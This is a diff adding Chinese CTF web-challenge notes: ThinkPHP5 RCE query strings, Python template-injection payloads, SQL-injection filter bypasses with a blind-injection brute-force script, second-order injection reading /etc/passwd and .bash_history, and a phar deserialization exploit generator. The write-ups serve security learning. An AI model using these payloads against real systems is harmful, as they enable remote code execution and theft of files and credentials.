@@ -1197,13 +1197,412 @@ print(l)
 
 https://bbs.ichunqiu.com/thread-16297-1-1.html
 
+## php_rce（攻防世界）
+
+phpthink5漏洞
+
+```
+?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=php%20-r%20%27system("ls");%27
+
+?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=php%20-r%20%27system("find / -name 'flag'");%27
+```
+
+## Web_python_template_injection（攻防世界）
+
+python模板注入
+
+尝试url/{{7+7}}执行
+
+```
+url/{{''.__class__.__mro__[2].__subclasses__()}}
+
+url/{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].listdir('.')}}
+
+url/{{''.__class__.__mro__[2].__subclasses__()[40]('fl4g').read()}}
+
+```
+
+## supersql（攻防世界）
+
+1.
+```
+?inject=1';show columns from `words`;--+
+```
+
+## 4月24日正则盲注
+
+[题目地址](http://47.102.127.194:8801/)
+
+源码
+
+```
+<?php 
+include "config.php";
+error_reporting(0);
+highlight_file(__FILE__); 
+
+$check_list = "/into|load_file|0x|outfile|by|substr|base|echo|hex|mid|like|or|char|union|or|select|greatest|%00|_|\'|admin|limit|=_| |in|<|>|-|user|\.|\(\)|#|and|if|database|where|concat|insert|having|sleep/i";
+if(preg_match($check_list, $_POST['username'])){
+    die('<h1>Hacking first,then login!Username is very special.</h1>'); 
+}
+if(preg_match($check_list, $_POST['passwd'])){
+    die('<h1>Hacking first,then login!No easy password.</h1>');
+}
+$query="select user from user where user='$_POST[username]' and passwd='$_POST[passwd]'"; 
+$result = mysql_query($query);
+$result = mysql_fetch_array($result);
+$passwd = mysql_fetch_array(mysql_query("select passwd from user where user='admin'"));
+if($result['user']){
+    echo "<h1>Welcome to CTF Training!Please login as role of admin!</h1>"; 
+}
+if(($passwd['passwd'])&&($passwd['passwd'] === $_POST['passwd'])){
+    $url = $_SERVER["HTTP_REFERER"];
+    $parts = parse_url($url);
+    if(empty($parts['host']) || $parts['host'] != 'localhost'){
+        die('<h1>The website only can come from localhost!You are not admin!</h1>');
+    }
+    else{
+        readfile($url);
+    }
+}
+?> 
+
+```
+
+主要是这句
+
+```
+$query="select user from user where user='$_POST[username]' and passwd='$_POST[passwd]'"
+```
+
+明显的单引号注入，但是大部分sql关键字都被过滤了，但是
+
+`or`可以用`||`代替
+
+`空格`可以用`\**\`代替
+
+`# -` ，我们用`;%00`绕过
+
+```
+payload: username=\&passwd=||passwd/**/REGEXP/**/"^d";%00
+```
+![image](http://note.youdao.com/yws/res/1199/13E30A0DA9334B46B8F9BACA596D6ABA)
+
+用sql表示出来是这样，可以看出第一个\闭合了后面的单引号和' passwd=，意思第一对单引号里的内容是`''\' and password='`，后面or语句用正则匹配密码开头第一个字母为d的行
+
+可以用brup一个字一个字的注入
+
+![image](http://note.youdao.com/yws/res/1211/66F79AEBD179433A9B09D7F32A91C540)
+
+然后用 admi/**/n和密码登录
+
+然后用Referer利用file://localhost/var/www/html/flag.php伪造本地读文件即可
+
+https://www.freesion.com/article/1270397693/
+
+https://blog.csdn.net/weixin_45940434/article/details/103722055?fps=1&locationNum=2
 
 
-## 
+## 4月25日注入题
 
+1. 使用fuzz字典发送过滤了绝大多数关键字，#，|（位或），^异或没有被过滤
+2. 构建payload
+```
+username=admin’|(ascii(mid((password)from(1)))>53)#&password=sd 
+//判断mid查出的字符的第一个字符的ascii码
+MID(column_name,start[,length])   //因为过滤掉空格的原因，才用上述格式
+```
 
+这里用的是位或，用异或也可以，或者用或
 
+3.当第一个字母的ascii等于53时，后半边为false，也就是0，前半边'admin' | 0等同于0 | 0，因为字符串和数字比较时，会把字符串转为浮点数，做隐式类型转换，所以位或得出0，而usernmae=0时返回所有值，因为弱类型比较
 
+4.python脚本
 
+```
+import requests
+url = "http://123.206.41.254:8080/index.php"
+r = requests.Session()
+result=''
+for i in range(1,33):
+ for j in range(37,127):
+  payload = "admin'|(ascii(mid((password)from({0})))>{1})#".format(str(i),str(j))
+  data={"username":payload,"password":"psdvs"}
+  print(payload)
+  html=r.post(url,data=data)
+  if "password error" in html.content:
+   result+=chr(j)
+   print(result)
+   break
+print(result)
+```
 
+5.用或时，让后半部分不等于,构造payload也可以得出
+```
+username=admin’|(ascii(mid((password)from(1)))<>53)#&password=sd 
+```
 
+http://www.ee50.com/zx/webaq/1061.html
+
+## 2018_wdb_comment（网鼎杯2018）
+
+1.git源码泄露，查看源码，二次注入，可以发现category第二次提取出来的时候没有进行过滤就直接放到sql语句了
+
+![image](http://note.youdao.com/yws/res/1253/9FC89B100F0F4AEE88FF221E8BB74314)
+
+sql语句是换行执行的，#进行注释只能注释当前行，所以我们这里用/**/进行拼接注释。
+
+构造payload
+
+```
+$sql = "insert into comment
+            set category = '123',content=user(),/*',
+                content = '*/#',
+                bo_id = '$bo_id'";
+```
+第二行content被注释掉，但是得二次注入在content里输入*/#才能显示
+
+依次注入
+```
+//查看www用户目录
+payload:123',content=(select( load_file('/etc/passwd'))),/* 
+//读history文件
+123',content=(select(load_file('//home/www/.bash_history'))),/*
+//在/tmp/html下有个.DS_Store文件，长度不够用hex读
+123',content=(select hex(load_file('/tmp/html/.DS_Store'))),/*
+//十六进制转文字发现flag_8946e1ff1ee3e40f.php
+123',content=(select hex(load_file('/var/www/html/flag_8946e1ff1ee3e40f.php'))),/*
+```
+
+## fakebook （网鼎杯2018）
+
+1.存在.bak文件，源码如下
+![image](http://note.youdao.com/yws/res/1276/D225B77164884B3693BE6111A9DC38F8)
+
+2.注册账号后，发现url存在get参数的数字型注入，order by可以发现有四列，过滤了union select，中间加/**/绕过，常规注入后，在user表的data列里看见一串序列化字符串
+
+![image](http://note.youdao.com/yws/res/1287/403775DA401C4CB492DF411A204E4164)
+
+3. 在源码里可以看见getblogcontent函数里有$this->get($this->blog);因此我们只要构造blog的路径指向flag.php
+
+![image](http://note.youdao.com/yws/res/1296/3CCC6A87654A43138D7921536123F811)
+
+## CISCN_2019_northern_China_day1_web1
+
+**phar反序列化**
+
+[一篇介绍php魔术方法的博客](https://www.cnblogs.com/20175211lyz/p/11403397.html#%E5%85%ADphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96)
+
+[介绍phar反序列化的blog1](https://www.freebuf.com/articles/web/205943.html)
+
+[这个博客很好](https://paper.seebug.org/680/)
+
+1.登录后发现利用下载接口可以传入路径获取网站源码
+
+![image](http://note.youdao.com/yws/res/1345/0876CF125AE3431F9DD124A15BF6ACFD)
+
+```
+//class.php
+
+<?php
+error_reporting(0);
+$dbaddr = "127.0.0.1";
+$dbuser = "root";
+$dbpass = "root";
+$dbname = "dropbox";
+$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);
+
+class User {
+    public $db;
+
+    public function __construct() {
+        global $db;
+        $this->db = $db;
+    }
+
+    public function user_exist($username) {
+        $stmt = $this->db->prepare("SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;");
+        $stmt->bind_param("s", $username);
+        $stmt->execute();
+        $stmt->store_result();
+        $count = $stmt->num_rows;
+        if ($count === 0) {
+            return false;
+        }
+        return true;
+    }
+
+    public function add_user($username, $password) {
+        if ($this->user_exist($username)) {
+            return false;
+        }
+        $password = sha1($password . "SiAchGHmFx");
+        $stmt = $this->db->prepare("INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);");
+        $stmt->bind_param("ss", $username, $password);
+        $stmt->execute();
+        return true;
+    }
+
+    public function verify_user($username, $password) {
+        if (!$this->user_exist($username)) {
+            return false;
+        }
+        $password = sha1($password . "SiAchGHmFx");
+        $stmt = $this->db->prepare("SELECT `password` FROM `users` WHERE `username` = ?;");
+        $stmt->bind_param("s", $username);
+        $stmt->execute();
+        $stmt->bind_result($expect);
+        $stmt->fetch();
+        if (isset($expect) && $expect === $password) {
+            return true;
+        }
+        return false;
+    }
+
+    public function __destruct() {
+        $this->db->close();
+    }
+}
+
+class FileList {
+    private $files;
+    private $results;
+    private $funcs;
+
+    public function __construct($path) {
+        $this->files = array();
+        $this->results = array();
+        $this->funcs = array();
+        $filenames = scandir($path);
+
+        $key = array_search(".", $filenames);
+        unset($filenames[$key]);
+        $key = array_search("..", $filenames);
+        unset($filenames[$key]);
+
+        foreach ($filenames as $filename) {
+            $file = new File();
+            $file->open($path . $filename);
+            array_push($this->files, $file);
+            $this->results[$file->name()] = array();
+        }
+    }
+
+    public function __call($func, $args) {
+        array_push($this->funcs, $func);
+        foreach ($this->files as $file) {
+            $this->results[$file->name()][$func] = $file->$func();
+        }
+    }
+
+    public function __destruct() {
+        $table = '<div id="container" class="container"><div class="table-responsive"><table id="table" class="table table-bordered table-hover sm-font">';
+        $table .= '<thead><tr>';
+        foreach ($this->funcs as $func) {
+            $table .= '<th scope="col" class="text-center">' . htmlentities($func) . '</th>';
+        }
+        $table .= '<th scope="col" class="text-center">Opt</th>';
+        $table .= '</thead><tbody>';
+        foreach ($this->results as $filename => $result) {
+            $table .= '<tr>';
+            foreach ($result as $func => $value) {
+                $table .= '<td class="text-center">' . htmlentities($value) . '</td>';
+            }
+            $table .= '<td class="text-center" filename="' . htmlentities($filename) . '"><a href="#" class="download">下载</a> / <a href="#" class="delete">删除</a></td>';
+            $table .= '</tr>';
+        }
+        echo $table;
+    }
+}
+
+class File {
+    public $filename;
+
+    public function open($filename) {
+        $this->filename = $filename;
+        if (file_exists($filename) && !is_dir($filename)) {
+            return true;
+        } else {
+            return false;
+        }
+    }
+
+    public function name() {
+        return basename($this->filename);
+    }
+
+    public function size() {
+        $size = filesize($this->filename);
+        $units = array(' B', ' KB', ' MB', ' GB', ' TB');
+        for ($i = 0; $size >= 1024 && $i < 4; $i++) $size /= 1024;
+        return round($size, 2).$units[$i];
+    }
+
+    public function detele() {
+        unlink($this->filename);
+    }
+
+    public function close() {
+        return file_get_contents($this->filename);
+    }
+}
+?>
+```
+可以看见三个类，user,Filelist,File。可以看到file类里的close方法有file_get_contents
+
+2.思路是构造pop链，User类中存在close方法，并且该方法在对象销毁时执行。
+
+同时FileList类中存在call魔术方法，并且类没有close方法。
+
+如果一个Filelist对象调用了close()方法，根据call方法的代码可以知道，文件的close方法会被执行，就可能拿到flag。
+
+如果能创建一个user的对象，其db变量是一个FileList对象，对象中的文件名为flag的位置。这样的话，当user对象销毁时，db变量的close方法被执行；而db变量没有close方法，这样就会触发call魔术方法，进而变成了执行File对象的close方法。通过分析FileList类的析构方法可以知道，close方法执行后存在results变量里的结果会加入到table变量中被打印出来，也就是flag会被打印出来。
+
+3.生成phar，利用//phar:伪协议读取flag，运行下列php文件，生成phar文件
+
+```
+<?php
+
+class User {
+    public $db;
+}
+
+class File {
+    public $filename;
+}
+class FileList {
+    private $files;
+    private $results;
+    private $funcs;
+
+    public function __construct() {
+        $file = new File();
+        $file->filename = '/flag.txt';
+        $this->files = array($file);
+        $this->results = array();
+        $this->funcs = array();
+    }
+}
+
+@unlink("phar.phar");
+$phar = new Phar("phar.phar"); //后缀名必须为phar
+
+$phar->startBuffering();
+
+$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
+
+$o = new User();
+$o->db = new FileList();
+
+$phar->setMetadata($o); //将自定义的meta-data存入manifest
+$phar->addFromString("exp.txt", "test"); //添加要压缩的文件
+//签名自动计算
+$phar->stopBuffering();
+?>
+```
+
+4. 修改后缀为png，上传成功后，利用delete.php读取源码
+
+![image](http://note.youdao.com/yws/res/1364/59BFF5912B1B447DB4EA0AD583FB5F92)
+
+转而用delete.php可能是因为download.php过滤了flag字样
